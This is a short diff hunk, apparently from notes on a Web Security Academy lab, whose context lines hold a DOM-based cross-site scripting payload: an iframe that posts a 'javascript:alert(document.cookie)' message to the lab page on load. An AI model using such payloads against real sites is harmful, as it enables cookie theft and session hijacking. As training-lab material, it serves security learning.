@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 <iframe src="https://acb11f271e33403880064a21005600ba.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
 
 ```
+
+
